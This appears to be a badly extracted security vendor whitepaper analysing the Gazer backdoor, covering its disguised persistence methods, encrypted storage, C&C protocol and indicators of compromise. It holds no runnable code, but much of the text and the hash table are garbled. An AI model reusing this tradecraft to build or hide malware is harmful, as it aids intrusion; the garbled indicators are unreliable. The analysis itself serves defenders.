path\nScreenSaveActive\n is set to \ufb011\ufb02: enable the screensaver\nScreenSaverIsSecure\n is set to eensaver is not password-protected\nScreenSaveTimeout\n is set to a value given in the resource.\nremains idle before the screensaver (in this case: the malware) starts.\n\u02dd: StartupAutorun\nIf the resource 105 begins with the \ndword\n value ,eated in the Start Menu. \n \nThe resource will also provide a description for the shor the path for the target \n \nor the LNK.\nThe \nIShellLink\n interface is used to create the shell link.\n\u02d9: TaskSchedulerAutorun\nThis method is used to achieve persistence by creating a scheduled task.\nThe task is created and set up through COM interfaces related to tasks (\nITaskService\n, \nITaskSettings, \u2013\n \n).\nSome information such as the task name and its description is retrieved from the resource. \n \nFor example, in one of the sample\u2122s resources,askSchedulerAutorun) \n \nwith the persistency data:\n%APPDATA%\\Adobe\\adobeup.exe Adobe Acrobat Reader Updater. This task was \ngenerated by Adobe Systems, Inc to keep your Adobe Software up-to-data. \n \n\\Adobe\\AcrobatReader.Adobe\nIn this example, a scheduled task will be created and set up thus:\nTask name: \ufb01\nAdobe Acrobat Reader Updater\n\ufb02\nExecutable: \ufb01\n%APPDATA%\\Adobe\\adobeup.exe\n\ufb02\nThe orchestrator will copy the loader received through the named pipe to this location\n \u02db\u02db\nTask description: \ufb01\nThis task was generated by Adobe Systems, Inc to keep your \nAdobe Software up-to-data\n\ufb02\nTask folder: \ufb01\n\\Adobe\\AcrobatReader.Adobe\n\ufb02\nLast but not least,ed to be started by the task scheduler at any time after \n \n\nits scheduled time has passed. The task will be triggered when the current user logs on.\n\u02c6: LinkAutorun\ne through \ncmd.exe\n.\nolder given in the resource, the icon and arguments are removed \n \nand the path is set to \ufb01\ncmd.exe\n\ufb02 with the argument set to:\n/q /c start \ufb01%s\ufb02 && start \ufb01%s\ufb02\nIn most of the samples we analyzed,TaskSchedulerAutorun \npersistence method should be used.\nLogs\nAll thr They are encrypted with the same \n\nIn some versions of Gazer, it is easy to retrieve hardcoded \ninto the binaries:\n%TEMP%\\CVRG72B5.tmp.cvr\n: the logs from the loader\n%TEMP%\\CVRG1A6B.tmp.cvr\n: the logs from the orchestrator\n%TEMP%\\CVRG38D9.tmp.cvr\n: the logs from the communication module\ned in the following way:\n\n[LOGSIZE][DECRYPTION_KEY][ENCRYPTED_LOG]\n\nlogsize: when this value (2 bytes) is subtracted from the magic value 0xf18b, it gives \n \nthe encrypted log size\ndecryption_key: when this 12 bytes blob is XORed with another hardcoded key of 12 bytes, \n \n\nit givypt the log\nencrypted_log: log encr\nOnce decrypted, each log entry is formatted in the following way:\n|Hour:Min:Sec:Ms| [log ID] [log]\n \u02db\u02dc\nHere is an example with the decr\n|10:29:56:197|\n \n[1556]\n|10:29:56:197|\n \n[1557]\n \n******************[...]****************\n|10:29:56:197|\n \n[1558]\n \nDATE: 25.05.2017\n|10:29:56:197|\n \n[1559]\n \nPID=900 TID=2324\n  \nHeaps=32\n \nC:\\Windows\\Explorer.EXE\n|10:29:56:197|\n \n[1565]\n \nDLL_PROCESS_ATTACH\n|10:29:56:197|\n \n[1574]\n \n4164\n|10:29:58:197|\n \n[0137]\n \n==================[...]================\n|10:29:58:197|\n \n[0138]\n \nCurrent thread = 2080\n|10:29:58:197|\n \n[0183]\n \nHeap aff0000 [34]\n|10:29:58:197|\n \n[0189]\n \n### PE STORAGE ###\n|10:29:58:197|\n \n[0215]\n \n### PE CRYPTO ###\n|10:29:58:197|\n \n[0246]\n \n### EXTERNAL STORAGE ###\n|10:29:58:197|\n \n[1688]\n \nOk\n|10:29:58:197|\n \n[0279]\n \nPath = \\HKCU\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Explorer\\ScreenSaver\n\n|10:29:58:197|\n \n[0190]\n \n\\HKCU\\Software\\Microsoft\\Windows\\\nCurrentVersion\\Explorer\\ScreenSaver\n\n|10:29:58:197|\n \n[0338]\n \n---FAILED\n|10:29:58:197|\n \n[0346]\n \nInitializing standart reg storage...\n|10:29:58:197|\n \n[0190]\n \nSoftware\\Microsoft\\Windows\\\nCurrentVersion\\Explorer\\ScreenSaver\n\n|10:29:58:197|\n \n[2605]\n \nStorage is empty!\n|10:29:58:197|\n \n[0392]\n \n### EXTERNAL CRYPTO ###\n|10:29:59:666|\n \n[1688]\n \nOk\n|10:29:59:713|\n \n[1473]\n \nOk\n|10:29:59:760|\n \n[1688]\n \nOk\n|10:29:59:775|\n \n[1473]\n \nOk\n|10:29:59:775|\n \n[1688]\n \nOk\n|10:29:59:775|\n \n[1473]\n \nOk\n|10:29:59:791|\n \n[1688]\n \nOk\n|10:29:59:791|\n \n[1473]\n \nOk\n|10:29:59:806|\n \n[1688]\n \nOk\n|10:29:59:806|\n \n[1473]\n \nOk\n|10:29:59:806|\n \n[0270]\n \n08-00-27-90-05-2A\n|10:29:59:806|\n \n[0286]\n \n_GETSID_METHOD_1_\n|10:29:59:806|\n \n[0425]\n \n28 7 8 122\n|10:29:59:806|\n \n[0463]\n \nS-1-5-21-84813077-3085987743-\n2510664113-1000\n\n|10:29:59:806|\n \n[0471]\n|10:29:59:806|\n \n[0787]\n \nOk\n|10:29:59:806|\n \n[1473]\n \nOk\n|10:29:59:822|\n \n[0514]\n \n### QUEUES ###\n|10:29:59:822|\n \n[0370]\n \nT Empty\n|10:29:59:822|\n \n[0482]\n \nR Empty\n|10:29:59:822|\n \n[1754]\n \nOk\n|10:29:59:822|\n \n[1688]\n \nOk\n|10:29:59:822|\n \n[1473]\n \nOk\n|10:29:59:838|\n \n[0505]\n \nR #4294967295\n \nPR_100\n \nTR_00000000\n \nSZ_172\n \nSC_0(50)\n \n--+-\n \nEX_0\n|10:29:59:838|\n \n[0625]\n \n### TRANSPORT ###\n|10:29:59:838|\n \n[0286]\n \n_GETSID_METHOD_1_\n|10:29:59:838|\n \n[0425]\n \n28 7 25 122\n|10:29:59:838|\n \n[0463]\n \nS-1-5-21-84813077-3085987743-\n2510664113-1000\n\n|10:29:59:838|\n \n[0471]\n|10:29:59:838|\n \n[0165]\n \n\\\\.\\pipe\\Winsock2\\\nCatalogChangeListener-2313-4\n|10:29:59:838|\n \n[0131]\n \nPipeName = \\\\.\\pipe\\Winsock2\\\nCatalogChangeListener-2313-4\n|10:29:59:838|\n \n[0041]\n \ntrue\n[...]\n \u02db\u02d9\nNote that in older Gazer versions, the \ufb01log ID\ufb02 was replaced by the name of the current function. \n \nWe believe that this log ID is an ID for the function where the log occurs.\nWorking Directory\nUsing the Windows Registry\nelated to Gazer (except the logs) are stored encrypted within the registry. The orchestrator\u2122s \n \nresource oot storage path (it will be designated \n%RootStoragePath%\n in the rest \n \nof this paper). In every sample we examined, this resource pointed to the same storage path:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ScreenSaver\nIf this resource is empty, the registry key above is used by default. Except for RSA keys, all the data \n \nin the storage is encrypted\n\u02d8\n.\nSeveral subdirectories (whose names are hardcoded in the binary) are created.\n%RootStoragePath%{119D263D-68FC-1942-3CA3-46B23FA652A0}\n\nObject ID: a unique ID to identify the victim\n%RootStoragePath%{1DC12691-2B24-2265-435D-735D3B118A70}\n\nTask Queue: linked list of tasks to be executed\n%RootStoragePath%{28E74BDA-4327-31B0-17B9-56A66A818C1D}\n\nPlugins\n%RootStoragePath%{31AC34A1-2DE2-36AC-1F6E-86F43772841F}\n\nCommunication Module: the DLL that communicates with the C&C\n \nserver\n%RootStoragePath%{3CDC155D-398A-646E-1021-23047D9B4366}\n\nAutorun: the persistency method\n%RootStoragePath%{4A3130BD-2608-730F-31A7-86D16CE66100}\nLocal Transport Settings: the computers IPs that are on the same network\n%RootStoragePath%{56594FEA-5774-746D-4496-6361266C40D0}\nLast Connection: last connection time with the C&C\n \nserver (structure \nSYSTEMTIME\n)\n%RootStoragePath%{629336E3-58D6-633B-5182-576588CF702A}\n\nRSA Private Kypt the data from Gazer storage.\n%RootStoragePath%{6CEE6FE1-10A2-4C33-7E7F-855A51733C77}\n\nResult Queue: linked list of the tasks results\n%RootStoragePath%{81A03BF8-60AA-4A56-253C-449121D61CAF}\n\nInject Settings: the list of processes to use to try to inject the communications module\n%RootStoragePath%{8E9810C5-3014-4678-27EE-3B7A7AC346AF}\n\nC&C\n \nservers\n \n See the \ufb01Gazer Resources\ufb02 section for details\n \u02db\u02c6\nUsing Alternate Data Streams\nIf it is not possible to access the registry,e stored using alternate \n \ndata streams.\nThe function \nGetVolumeInformation\n is called to ensure that the volume \ufb01C:\\\ufb02 supports named \nstreams in order to use ADS.\n\nThe same GUIDs as above arent data in an ADS fdcoded \n \nin the binary):\n\ufb01%TEMP%\\KB943729.log\ufb02\nFor example, here is the full path to access the object ID:\n%TEMP%\\KB943729.log:{1DC12691-2B24-2265-435D-735D3B118A70}\nOrchestrator\nGazer Resources\nThe Gazer-re stored in the orchestrator\u2122s resources.\nFile format\nThere are a total of 11 red in the following way:\n[DATATYPE][SIZE][DATA][PADDING]\n\nDATATYPE: A \ndword\nesource\nw data\ny\ny\nSIZE: the size of the data (without padding)\nEncryption\nExcept for resources 101 and 102 which are RSA keys, every resource is compressed with BZip \n \nand encr\n[RSAEncryptedBlob][Signatur\nRSAEncryptedBlob: . This blob \nis encrypted using RSA and can be decrypted using r.\nSignatureBlob: The second pare \n \n\nof the last part of the data once decrypted.\n3DESBlob: The last pare data, which is encrom \n \n\nEach resource is decre is compared with the decrypted data to check \n \n\nthe integrity. Decrypted resources that pass this integrity check are encrypted with a new RSA key \n\ngenerated randomly by the orchestrator code. The private key and the encrypted resource are then \n\nstored in the registr.\n \u02db\u02c7\nResources listing\n. It is used to decrypt the other resources.\n.\ne the persistency information\nocesses to use to try to inject the communications module\nC communication DLL\nC\n \nserver list\nectory path\nt information\nTask Execution\nWhen a task is retrieved from the C&C, it is either executed by the infected machine or by another \ncomputer on the same network thry this was done \n \n\nin Carbon and Snake).\nThe task can be:\n\ncommand execution\nThe result of the task is stored in a queue and forwarded to the module that communicates \n \nwith the C&C\n \nserver when access to the Internet is available.\nClasses Hierarchy\nThe malware is written in C++ and the \nRTTI\n that contains information about the objects used \n \nin the code is not overwritten.\n\nThere are 5 abstract classes that have several implementations.\n \nTable \u02dc.\n \nAbstract Class Autorun\nClass Name\nLinkAutorun\nStartupAutorun\n\nShellAutorun\nScreenSaverAutorun\nTaskSchedulerAutorun\n\nHiddenTaskAutorun\n \u02db\u02d8\n \nTable \u02da.\n \nAbstract Class Queue\nClass Name\nTaskQueue\nResultQueue\n \nTable \u02db.\n \nAbstract Class Storage\nClass Name\nExeStorage\n\nFSStorage\nRegStorage\n \nTable \u02dd.\n \nAbstract Class TListenerInterface\nClass Name\nLTMessageProcessing\nCMessageProcessingSystem\n \nTable \u02d9.\n \nAbstract Class TAbstractTransport\nClass Name\nLTNamedPipe\n\nTNPTransport\nCommunication Module\nThe communication module is used to retrieve tasks from the C&C\n \nserver and to dispatch them \n \nto the orchestrator.\nThis library is injected into a process which can legitimately communicate over the Internet. \n \nThe injection library is the same as the one found in the loader to inject the orchestrator \n \ninto \ufb01\nexplorer.exe\n\ufb02.\nCommunication Initialization\nIf a proxy server exists, it is retrieved and used by Gazer to make the HTTP requests. There are two \nent methods used to retrieve this value, either by requesting the following registry key:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\nor through the function \nInternetQueryOption\nINTERNET_OPTION_PROXY\n if the proxy \nserver cannot be retrieved through the registry.\nThe system user agent is then set up:\n\nthe default value of the \ufb01\nHKCU\\Software\\Microsoft\\Windows\\Current Version\\\nInternet Settings\\User Agent\n\ufb02 key is retrieved;\n \u02db\u02dd\nthe value keys under \ufb01\nHKLM\\Software\\Microsoft\\Windows\\Current Version\\Internet \nSettings\\5.0\\User Agent\\Post Platform\n\ufb02 are enumerated and those that contain \n \nthe sub-string \ufb01\nIEAK\n\ufb02 are concatenated with the user agent string from the previous step;\nin the case that no user agent was found in the registry, the hardcoded UA \nMozilla/4.0 \n\n(compatible; MSIE 6.0)\n is used\nBefore attempting any contact with the C&C\n \nserver, the internet connection is checked by trying \n \n\nto reach the following servers one by one until one returns a HT\nupdate.microsoft.com\nmicrosoft.com\nwindowsupdate.microsoft.com\nyahoo.com\ngoogle.com\nC&C\n \nserver communication\nThe malware communicates with its C&C\n \nserver to retrieve tasks (through HTTP GET requests) \n \nand to send the tasks results (through HTTP POST requests).\nBefore sending a request to the C&C, the command \nCMC_GIVE_SETTINGS\n is sent to the orchestrator \nthrough its communication channel (a named pipe, more on this in the next section). The message \n(\nMSG\n) contained in the packet in this case is a single byte set by the orchestrator for the command \nresult status.\nThe orchestrator replies on the same channel with the settings retrieved from the working directory \nwith the object id, the list of the C&C\n \nservers and the last connection date.\nA GET request is performed to retrieve a task from the C&C.\n\nThe parameters of the GET request are chosen from amongst a hardcoded list of keywords that does \n \nnot look suspicious. Their values ar\n\nfrom a range given for each parameter:\nid\n [6-12]\n \n(As with all other parameters, if this parameter is used in the request, it will have a random \nvalue (of letters and digits) with a random size between 6 and 12 characters.)\nhash\n [10-15]\nsession\n [10-15]\nphoto\n [6-10]\nvideo\n [6-10]\nalbum\n [6-10]\nclient\n [5-10]\nkey\n [5-10]\naccount\n [6-12]\nmember\n [6-12]\npartners\n [5-10]\nadm\n [6-12]\nauthor\n [6-12]\n contact\n [6-12]\ncontent\n [6-12]\nuser\n [6-12]\nHere are few examples of such requests:\nxxx.php?album=2ildzq&key=hdr2a&partners=d2lic33f&session=nurvxd2x0z8bztz&video\n \n=sg508tujm&photo=4d4idgkxxx.php?photo=he29zms5fc&user=hvbc2a&author=xvfj5r0q\n \n9c&client=7mvvc&partners=t4mgmuy&adm=lo3r6v4xxx.php?member=ectwzo820&contact\n \n=2qwi15&album=f1qzoxuef4&session=x0z8bztz8hrs65f&id=t3x0ftu9xxx.php?partners\n \n=ha9hz9sn12&hash=5740kptk3acmu&album=uef4nm5d&session=dpeb67ip65f&member=arj6\n \nx3ljjxxx.php?video=nfqsz570&client=28c7lu2&partners=818eguh70&contact=ibj3xch\n \n&content=1udm9t799ixr&session=5fjjt61qred9uo\nA timeout of 10 minutes is set for each request (send/receive/connect) through \nInternetSetOption\n.\nOnce the request is sent, the response is handled only if the returned HTTP status code is 404.\n \nThe content of the response is encrypted and can be decrypted with the private RSA key generated \nby the orchestrator. The r The blob \n\nis hashed and compare the integrity of the server\u2122s response.\nIf the response size is 20 bytes (a blob of 4 bytes + the hash), there are no tasks to retrieve.\n\nA command \nCMC_TAKE_TASK\n is sent to the orchestrator with the encrypted task received from \nthe C&C\n \nserver and its size. The orchestrator will be in charge of executing the task and will send \nthe results to the communication module. Once the blob of the tasks results (encrypted by the \n\norchestrator) is received, it is sent to the C&C\n \nserver through a POST request in the same way \n \n\nthat it was done for the GET request (using parameters with random values).\nMessages between components\nA global named pipe is used for the communication betwent components. The data \n\nsent through this named pipe is formatted in the following way:\n\u02dc\u02da\u02db\n \nFigure \u02db.\n \nMessage format\nDATATYPE: the same constants are used for the resources (check the File Format entry \n \nin the \ufb01Resources section\ufb02)\nID_CMD: the command name (check below for a complete list)\nMSG: the data to be sent\nHerent commands:\nCMC_TAKE_TASK (ID_CMD: 1)\nWhen a task is retrieved by the C&C\n \nserver module, it is sent to the orchestrator, \n \nwhich stores the task in the task queue.\nCMC_TAKE_LOADER_BODY (ID_CMD: 2)\n Wipe Gazer\u2122 clean persistency and set up a copy of the loader \n \nand its persistency according to one of the resources (check persistency part for details).\nCMC_GIVE_RESULT (ID_CMD: 4)\nWhen this message is received, the orchestrator will retrieve the task\u2122s result from \n \nthe result queue, compress and encrypt it using the server\u2122s public RSA key (the one \n \n\nfrom the resource 102) and send the blob to the communication module which will send \n\nthe whole result to the server through a POST request.\nCMC_GIVE_SETTINGS (ID_CMD: 5)\nThe communication module sends this message to the orchestrator to request \n \nthe information needed to contact the server (list of the servers to contact, the last \n\nconnection time and the victim ID).\nCMC_\nTAKE_CONFIRM_RESULT (ID_CMD: 6)\nWhen the communication module sends a task\u2122s result to the server, a message is sent \n \n\nto the orchestrator that will remove the task\u2122s result from the queue.\nCMC_TAKE_CAN_NOT_WORK (ID_CMD: 7)\nWhen an operation has failed (for example, if the communication module cannot correctly \nparse the data received from the orchestrator), this message is sent to the orchestrator \n\nwith the last error code. The err\nCMC_TAKE_UNINSTALL (\nID_CMD: 8)\nom the disk.\nCMC_TAKE_NOP (ID_CMD: 9)\nNo operation\nCMC_NO_CONNECT_TO_GAZER (\nID_CMD: 0xA)\nThis command is sent to the orchestrator when the communication module cannot \ncontact any of the servers. In this case, if a pending task\u2122s results are in the queue, \n \n\nthey are stored encrypted in Gazer\u2122s storage.\nCMC_TAKE_LAST_CONNECTION (ID_CMD: 0xB)\nThis command is sent from the communication module to the orchestrator each time \n \na connection is established to the C&C server. It contains a structure \nSystemTime\nwith the current system time). Once the message is received by the orchestrator, \n \nthe last connection date is stored compressed and encrypted in the Gazer storage \n \n(either the registry or ADS).\nCMC_GIVE_CACHE / CMC_TAKE_CACHE (\nID_CMD: 0xC / 0xD)\nNot implemented\n \u02dc\u02da\nGAZER VER\nSI\nON\nS\nent versions hav\nersion, the function used to write logs has as its parameter the real function name \n \nwhere the log occurs. There werent methods used to inject code (the one documented \n \nin this whitepaper and one based on window injection). \nIn a second version, the function names used as parameters are replaced by an ID and only one method \n \nis used for code injection. Also, the string \ufb01NO OLD METHODS\ufb02 appears in this part of the code.\n\nSome samples frersions were signed with a valid ceror \ufb01Solid \nLoop Ltd\ufb02. The compilation date appears to be 2002 but is likely to be faked because the cer\n \n\nwas issued in 2015.\nThe latest versions arent cer\ufb01Ultimate Computer Support Ltd\ufb02.\n \nFigure \u02dd.\n \nCerticates used to sign the malware variants\nts have been made to obfuscate strings that can be used as IoCs. The mutex name and \nthe named pipe do not appear in cleartext anymore; they are now encoded with a \nXOR\n key. On the \nprevious versions,ere hardcoded in the binary. The function \nGetTempFileNameA\n \n The C&C\n \nserver returns a 404 or 502 status code page, \n\nwhereas it was only a 404 in the previous versions.\nIn the latest versions compiled in 2017, the log messages arent (although they have the same \nmeaning). For example: \n\ufb01PE STORAGE\ufb02\n is replaced by \n\ufb01EXE SHELTER\ufb02\n, \n\ufb01PE CRYPTO\ufb02\n by \n\ufb01EXE \nCIPHER\ufb02\n etc\u2013\n \nLast but not least, the compilation timestamp seems not to be faked anymore.\nIn conclusion, Gazer is a very sophisticated piece of malwarent \ntargets in several countries around the world. Thrent versions we found and analyzed, \n\nwe can see that this malicious backdoor is still being actively developed and used by its creators.\nIndicators of Compromise can also be found on \ngithub\n. For any inquiries, or to make sample submissions related \nto the subject, contact us at: \nthreatintel@eset.com\n. \n \u02dc\u02db\nIOC\nS\nFilenames\n%TEMP%\\KB943729.log\n%TEMP%\\CVRG72B5.tmp.cvr\n%TEMP%\\CVRG1A6B.tmp.cvr\n%TEMP%\\CVRG38D9.tmp.cvr\n%TEMP%\\~DF1E06.tmp\n%HOMEPATH%\\ntuser.dat.LOG3\n%HOMEPATH%\\AppData\\Local\\Adobe\\AdobeUpdater.exe\nRegistry keys\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ScreenSaver\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Explorer\\ScreenSaver\nC&C URLs\ndaybreakhealthcare.co.uk/wp-includes/themees.php\nsimplecreative.design/wporm/single.php\n169.255.137.203/rss_0.php\noutletpiumini.springwaterfeatures.com/wp-includes/pomo/settings.php\nzerogov.com/wp-content/plugins.deactivate/paypal-donations/src/PaypalDonations/SimpleSubsribe.\nphp\n/core/connector/php/php4/CommandHandler/CommandHandler.php\ndyskurs.com.ua/wp-admin/includes/map-menu.php\nwarrixmalaysia.com.my/wp-content/plugins/jetpack/modules/contact-form/grunion-table-form.php\n217.171.86.137\n217.171.86.137/rss_0.php\nshinestars-lifestyle.com/old_shinstar/includes/old/front_footer.old.php\nwww.aviasiya.com/murad.by/life/wp-content/plugins/wp-accounting/inc/pages/page-search.php\nbaby.greenweb.co.il/wp-content/themes/san-kloud/admin.php\nsoligro.com/wp-includes/pomo/db.php\ngiadinhvabe.net/wp-content/themes/viettemp/out/css/class.php\ntekfordummies.com/wp-content/plugins/social-auto-poster/includes/libraries/delicious/Delicious.php\nkennynguyen.esy.es/wp-content/plugins/wp-statistics/vendor/maxmind-db/reader/tests/MaxMind/Db/\ntest/Reader/BuildTest.php\nsonneteck.com/wp-content/plugins/yith-woocommerce-wishlist/plugin-fw/licence/templates/panel/\nactivation/activation.php\nchagiocaxuanson.esy.es/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/\nngglegacy/admin/templates/manage_gallery/gallery_pr\nhotnews.16mb.com/wp-content/themes/twentysixteen/template-parts/content-header.php\nzszinhyosz.pe.hu/wp-content/themes/twentyfourteen/page-templates/full-hight.php\nweandcats.com/wp-content/plugins/broken-link-checker/modules/checkers/http-module.php\nMutexes\n{531511FA-190D-5D85-8A4A-279F2F592CC7}\n \u02dc\u02dc\nHashes\n \nTable \u02c6.\n \nGazer sample hashes\nSHA1 hash \nComponent\nCompilation \nTime\nCer\nEset Detection \nName\n\u02dc\u02dd\nFA\nDE\n\u02dd\u02da\u02c7\nE\nB\nAA\n\u02c6B\u02db\u02db\nC\n\u02c6B\u02c7\nFE\n\u02dd\u02dc\u02dd\u02dd\nF\nF\nGazer wiper x\u02db\u02c7\nnot signed\nWin\u02db\u02c7/Turla.CL\n\u02d9\u02c7\nF\n\u02dc\u02da\u02c7\u02d9\u02d8\u02dd\nE\n\u02dc\nE\n\u02c7\nF\nA\nAE\n\u02d8\nFF\n\u02da\u02dd\u02d8\u02dc\u02d8B\u02c7\u02dc\u02d8\nA\n\u02dd\nGazer loader x\u02db\u02c7\nadmin@solidloop.org\n \nvalid fr\nWin\u02db\u02c7/Turla.CC\nB\u02db\u02c7\u02db\nCD\n\u02dd\nC\n\u02c6\nF\nE\n\u02c7\u02d9\nA\nDC\nB\nDE\nB\u02dd\nCE\n\u02d8\u02db\nCCDD\n\u02db\u02c6\u02d8\nE\nA\nB\nGazer loader x\u02db\u02c7\nadmin@solidloop.org\n \nvalid fr\nWin\u02db\u02c7/Turla.CC\nE\n\u02c6\u02daBB\u02c7B\nEEC\nE\nFE\n\u02c7\u02d9\u02dd\nF\nAD\n\u02d8B\u02dd\u02dd\nE\nA\nGazer loader x\u02db\u02c7\nadmin@solidloop.org\n \nvalid fr\nWin\u02db\u02c7/Turla.CC\n\u02c7\u02dc\u02dc\nE\n\u02c7\nF\n\u02da\u02dc\nC\n\u02da\u02d8\nAD\n\u02dc\u02db\u02c7\nC\nD\n\u02da\nC\n\u02dc\u02d9\nC\n\u02c7\nA\n\u02d8\nA\n\u02c7\u02dc\u02d9\nD\n\u02d9\u02c6\nAE\n\u02c6\nE\nGazer loader x\u02d9\u02dd\n\u02da\u02dc:\u02db\u02d9:\u02c7\u02d9\nadmin@solidloop.org\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\nC\nA\n\u02c7\u02dd\nFF\nC\nF\n\u02d8\u02d9\u02da\u02d9\u02db\u02dc\nFA\nB\nC\nBB\nA\n\u02dd\nGazer loader x\u02d9\u02dd\n\u02da\u02dc:\u02db\u02d9:\u02c7\u02d9\nadmin@solidloop.org\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\n\u02dc\u02d8\u02dd\nF\n\u02db\u02c6\u02c6\nD\n\u02dd\u02dd\u02dbB\u02c6\nE\nDECD\n\u02c7\u02da\u02c7\nC\n\u02c6\nA\nGazer loader x\u02d9\u02dd\n\u02da\u02dc:\u02db\u02d9:\u02c7\u02d9\nadmin@solidloop.org\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\n\u02c7\u02dc\nF\n\u02d8\nD\nCCCD\nB\nC\nD\n\u02d8\u02d8\nC\nE\n\u02dd\nCCF\nC\n\u02c6B\u02c6\nD\nGazer loader x\u02db\u02c7\n\u02da\u02c6:\u02db\u02da:\u02db\u02dc\nadmin@solidloop.org\n \nvalid fr\nWin\u02db\u02c7/Turla.CC\n\u02c6\u02dd\u02c7\nC\n\u02c6\u02c6\nACC\n\u02c6\nDAE\nA\nB\u02d8\u02d9\nF\nGazer loader x\u02db\u02c7\n\u02da\u02c6:\u02db\u02da:\u02db\u02dc\nadmin@solidloop.org\n \nvalid fr\nWin\u02db\u02c7/Turla.CC\n\u02dc\u02dc\u02c7\u02c6\u02dc\nA\n\u02d9\u02dc\u02c6\u02c7\nD\n\u02c7\u02dcB\u02ddB\nCD\nB\u02d9\nEAEF\nF\n\u02c6\u02c7\u02db\nF\nGazer loader x\u02db\u02c7\n\u02da\u02c6:\u02db\u02da:\u02db\u02dc\nadmin@solidloop.org\n \nvalid fr\nWin\u02db\u02c7/Turla.CC\nFAA\nFCADAC\n\u02dd\u02db\u02da\nC\nD\nFF\nGazer loader x\u02d9\u02dd\n\u02da\u02c6:\u02db\u02dd:\u02da\u02c6\nadmin@solidloop.org\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\nE\n\u02da\u02c7\nA\nC\n\u02db\u02dd\u02dd\u02dc\u02c6B\u02dd\nC\n\u02c6\nF\n\u02c6\u02c6\nF\nA\n\u02d8\nC\nB\nF\nB\u02db\nC\nD\nGazer loader x\u02d9\u02dd\n\u02da\u02c6:\u02db\u02dd:\u02da\u02c6\nadmin@solidloop.org\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\n\u02d8\nDEC\nD\n\u02dc\u02db\u02dcB\u02d8\u02dd\u02d9\u02c7\u02d8\u02dc\u02da\u02daBB\nAC\n\u02c7\nEC\n\u02dd\nFA\n\u02c6\u02db\nC\n\u02dd\u02db\u02d8\nD\nGazer loader x\u02d9\u02dd\n\u02da\u02c6:\u02db\u02dd:\u02da\u02c6\nadmin@solidloop.org\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\nDF\nA\n\u02dd\u02d8\nD\n\u02dc\nA\n\u02d8\u02d9\u02d9\u02dc\u02dd\u02c6\u02d9\u02c6\nC\n\u02da\u02dc\nD\n\u02da\nD\nD\nGazer loader x\u02d9\u02dd\nnot signed\nWin\u02d9\u02dd/Turla.AA\nC\n\u02d9\nE\n\u02d8\u02c7\u02db\u02db\u02d9\u02dd\u02dd\nDFE\nA\n\u02d9\u02c6\nE\nDDA\nC\n\u02d9\nC\nGazer loader x\u02d9\u02dd\nadmin@\nultimatecomsup.biz\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\nFF\n\u02c6\nF\nCA\nC\n\u02d9\u02dd\nD\n\u02daB\u02db\nF\n\u02da\nE\n\u02daB\u02dc\u02dc\u02d9\u02dc\u02dc\nD\nE\nA\nGazer loader x\u02d9\u02dd\nadmin@\nultimatecomsup.biz\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\n \u02dc\u02d9\nSHA1 hash \nComponent\nCompilation \nTime\nCer\nEset Detection \nName\nAA\nD\nD\nA\n\u02c7\u02d9\nD\n\u02dc\u02d8\u02da\u02c6\nD\nAD\n\u02db\nC\n\u02db\nE\nGazer loader x\u02d9\u02dd\nadmin@\nultimatecomsup.biz\n \nvalid fr\nWin\u02d9\u02dd/Turla.AA\nCECC\n\u02dd\u02da\nF\n\u02dcB\u02dc\nD\nA\nF\nD\n\u02c6\u02c7\nF\n\u02c7\nE\nGazer loader x\u02d9\u02dd\nadmin@\nultimatecomsup.biz\n \nvalid fr\nWin\u02d9\u02dd/Turla.AG\n\u02dd\nFAC\n\u02c6\nFC\n\u02db\u02d9\u02da\u02d8\u02d9\u02dd\nAFA\nB\u02d9\u02db\nC\n\u02c7\u02d8\nCE\n\u02da\nA\n\u02da\u02db\nE\n\u02c7\u02c7\u02c7\nD\n\u02c7\nDEA\n\u02c6\u02da\nD\nGazer loader x\u02d9\u02dd\n\u02c7\u02db:\u02dd\u02db:\u02d8\u02da\nadmin@\nultimatecomsup.biz\n \nvalid fr\nWin\u02d9\u02dd/Turla.AD\nA\n\u02c7\u02db\u02c6\u02dc\u02d8\nCA\nC\nE\n\u02dbB\nE\n\u02dc\u02dc\u02dc\u02dd\u02d8\nC\n\u02dc\u02db\nA\n\u02da\u02c6\u02c6\nGazer loader x\u02db\u02c7\nadmin@\nultimatecomsup.biz\n \nvalid fr\nWin\u02db\u02c7/Turla.CF\nF\nEED\nFAD\n\u02dd\u02c7\u02d8\nF\n\u02c6\u02d8\u02c7\u02dbB\nE\n\u02da\nE\nGazer loader x\u02d9\u02dd\nadmin@\nultimatecomsup.biz\n \nvalid fr\nWin\u02d9\u02dd/Turla.AD\nDA\nA\nED\n\u02d8\u02d8\u02db\nE\n\u02db\u02dd\nE\n\u02da\u02da\nEF\nB\nA\nE\nFD\n\u02db\u02dd\nFAE\n\u02da\u02c7\u02c6\nGazer \norchestrator x\u02db\u02c7\n\u02da\u02dc:\u02db\u02da:\u02c7\u02c6\nnot signed\nWin\u02db\u02c7/Turla.CF\nD\n\u02db\u02c6\u02dc\nA\n\u02ddB\nDCED\n\u02db\u02dc\u02c6\nFDCC\nEDFE\nF\n\u02d9\nACCEA\nA\nGazer \norchestrator x\u02db\u02c7\n\u02da\u02dc:\u02db\u02da:\u02c7\u02c6\nnot signed\nWin\u02db\u02c7/Turla.CF\n\u02da\nF\nF\nFA\nB\u02dd\nF\n\u02c6\u02dc\u02c6\u02d9\u02c6\u02da\nC\n\u02dc\u02c6\u02d8\nD\n\u02d9\nA\nC\nGazer \norchestrator x\u02db\u02c7\n\u02da\u02dc:\u02db\u02da:\u02c7\u02c6\nnot signed\nWin\u02db\u02c7/Turla.CF\nD\nE\nA\n\u02da\nFDC\nD\nD\n\u02dd\u02d9\nF\nF\n\u02dbB\nGazer \norchestrator x\u02db\u02c7\n\u02da\u02dc:\u02db\u02da:\u02c7\u02c6\nnot 